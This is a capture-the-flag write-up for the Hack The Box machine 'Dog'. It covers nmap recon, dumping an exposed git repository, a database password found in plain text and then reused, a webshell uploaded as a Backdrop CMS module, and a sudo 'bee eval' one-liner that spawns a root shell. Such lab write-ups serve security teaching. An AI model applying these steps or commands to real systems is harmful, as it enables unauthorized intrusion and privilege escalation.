---
title: 'HTB-Dog'
published: 2025-07-11
draft: false
toc: true
tags: ['bee', 'git', 'git-dumper', 'password-spraying']
---

---
```
Scope:
10.10.11.58
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -vvvv -p- -T5 --min-rate=5000 -Pn dog.htb

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-title: Home | Dog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I notice there's a `.git` repo found, let's check it out.

## git-dumper

![](attachments/c8b373543229ec186a5ae43c062093cb.png)

![](attachments/fd4384ada43c0ffc87f82dd4a9ce70a6.png)

Using `git log` I notice only 1 commit:

![](attachments/c4ba8265186c78e25c2c56b96a973a23.png)

Within `settings.php` I find a set of creds:

![](attachments/4a7fb4624782b456d14604ff80759ed4.png)

```
root
BackDropJ2024DS2024
```

:::note
However *root* is not recognized as a username so it must be solely for `mysql`.
:::

### grep

In order to find the username amongst all the files I used:

```bash
grep -r dog.htb
```

![](attachments/4a41c665bf37bb01a42611f8af893ec5.png)

This spat out the username, let's try it out.

## 80/TCP - HTTP

![](attachments/4aa0448d03dd78a8305ffc306be5a0fa.png)

I got in with the combination of creds, let's check it out.

I notice a lot of user accounts:

![](attachments/25eaccabb6a87509bd99b68b03c6817a.png)

I then found a way to add pages in **Home** -> **Add Content**:

![](attachments/0cd3589bdccce9a0ffedc30554982a41.png)

I tried making a webshell out of a page:

![](attachments/b36cb8d90e37cea46f906f6a0ab4dc33.png)

![](attachments/3c54e0aece2518a7bbbcd6a2baa7b9b8.png)

Unfortunately this didn't work.

Instead I will try to upload it as a *theme*:

![](attachments/ea18522c474543765d6c5cad9fca2108.png)

But I require an `.info` file:

![](attachments/7462da9f19f088b4333dc3e1fe6d82ff.png)

I create my `webshell.info` file:

```php
type = module
name = Block
description = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page.
package = Layouts
tags[] = Site Architecture
version = BACKDROP_VERSION
backdrop = 1.x

configure = admin/structure/block

; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662
```

And bundle it with the webshell:

![](attachments/cc7d7975b066413f44274a57ee130a7b.png)

![](attachments/8844d6c461732bf0d6978dfb4ed084f7.png)

Now I upload it:

![](attachments/eeeba18beb1b3900003b324a25000cec.png)

I can find it here:

![](attachments/ab8dcb8028e32b30d095d5e1560f612c.png)

![](attachments/5d0d9a53325d2d2ce1f1487f57654aa3.png)

Let's get a foothold.

# Foothold
## Shell as www-data

![](attachments/60d11b5d7405d3e1ee0f15746c33c580.png)

![](attachments/2b3093b946933958f396fdaa2a860ca0.png)

I then check whether `mysql` is open:

![](attachments/4077022e115cef4b5fec2f93f47eae85.png)

It is, let's try to access it.

### mysql

I easily log in with the previous found creds:

```
root
BackDropJ2024DS2024
```

![](attachments/11575ab4ce377ef70cf6883cb1b5fdab.png)

![](attachments/44028664126771d2a833bd321417130a.png)

![](attachments/089d48fe268b42d192f14308bfcf3fc0.png)

I went ahead and copied over *john* and *jobert*'s hashes since these had a higher priority.

![](attachments/9d34d55dc058532504eb668ffce5d1e4.png)

:::note
Makes sense since **Backdrop CMS** is based on **Drupal**.
:::

![](attachments/c630e699fcd29f12d8e56159b28b3617.png)

### hash cracking - FAIL

![](attachments/7ee04d5b1df59f6e2870b520529dbc3d.png)

This went on for way too long so I tried out `john` but that didn't give any result either:

![](attachments/7dc2dc970bf56fb30d8dd23d814bdee3.png)

I then just tried to password spray the previous found pass and it worked!

![](attachments/17a305ffc1d35663a252ff0c47e3d8a3.png)

### user.txt

![](attachments/ebcf1ee8497b4eec7af7331c232a279a.png)

![](attachments/c1b6bfe2c03b0c3be1c32ed9f35bc38e.png)

# Privilege Escalation
## Bee binary

I went ahead and tried the binary to see what it does and found this:

![](attachments/8ff6cf9ad0d6d5b887db7812256b76cc.png)

I can thus use the following command:

```bash
sudo /usr/local/bin/bee --root=/var/www/html eval 'system("/bin/bash -p");'
```

![](attachments/2d0b2846d667616746a2643b2b2ce901.png)

And now I'm *root*.

### root.txt

![](attachments/e8035f8984b58857df4e0c50d55b9196.png)

![](attachments/6921617b3a610d8f4583c53974a52570.png)

---